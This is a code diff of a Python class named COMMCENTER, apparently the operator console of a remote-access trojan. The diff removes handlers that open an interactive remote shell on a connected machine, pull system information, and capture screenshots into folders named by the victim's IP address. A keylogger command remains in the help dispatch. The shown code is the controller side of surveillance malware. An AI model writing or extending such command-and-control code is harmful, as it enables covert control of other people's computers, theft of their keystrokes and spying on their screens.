@@ -19,16 +19,8 @@ class COMMCENTER:
                 help_c_connect()
             elif vals[1] == "disconnect":
                 help_c_disconnect()
-            elif vals[1] == "clear":
-                help_c_clear()
-            elif vals[1] == "shell":
-                help_c_shell()
             elif vals[1] == "keylogger":
                 help_c_keylogger()
-            elif vals[1] == "sysinfo":
-                help_c_sysinfo()
-            elif vals[1] == "screenshot":
-                help_c_screenshot()
         else:
             if self.CURRENT:
                 help_c_current()
@@ -80,27 +72,6 @@ class COMMCENTER:
         print(tabulate.tabulate(lister, headers=headers))
         sys.stdout.write("\n")
 
-    def c_shell(self):
-        result = ""
-        if self.CURRENT:
-            sys.stdout.write("\n")
-            while True:
-                val = input("# ")
-                val = "shell:" + val.rstrip(" ").lstrip(" ")
-
-                if val:
-                    if val != "shell:exit":
-                        self.CURRENT[1].send_data(val)
-                        result = self.CURRENT[1].recv_data()
-                        if result.strip(" "):
-                            print(result)
-                    else:
-                        break
-        else:
-            sys.stdout.write("\n")
-            print_red("You need to connect before execute this command!")
-            sys.stdout.write("\n")
-
     def c_clear(self):
         subprocess.call(["clear"], shell=True)
 
@@ -141,34 +112,6 @@ class COMMCENTER:
                     print_red("Invalid Syntax!")
             else:
                 print_red("Invalid Syntax!")
-        else:
-            print_red("You need to connect before execute this command!")
-
-    def c_sysinfo(self):
-        if self.CURRENT:
-            self.CURRENT[1].send_data("sysinfo:")
-            result = self.CURRENT[1].recv_data()
-            if result.strip(" "):
-                print(result)
-        else:
-            print_red("You need to connect before execute this command!")
-
-    def c_screenshot(self):
-        if self.CURRENT:
-            self.CURRENT[1].send_data("screenshot:")
-            result = self.CURRENT[1].recv_data()
-            dirname = os.path.dirname(__file__)
-            dirname = os.path.join(dirname, 'screenshots')
-            if not os.path.isdir(dirname):
-                os.mkdir(dirname)
-            dirname = os.path.join(dirname, '%s' % (self.CURRENT[1].ip))
-            if not os.path.isdir(dirname):
-                os.mkdir(dirname)
-            fullpath = os.path.join(dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.png"))
-            fl = open(fullpath, 'wb')
-            fl.write(result)
-            fl.close()
-            print_green("Saved: [" + DARKCYAN + fullpath + END + "]")
         else:
             print_red("You need to connect before execute this command!")
 
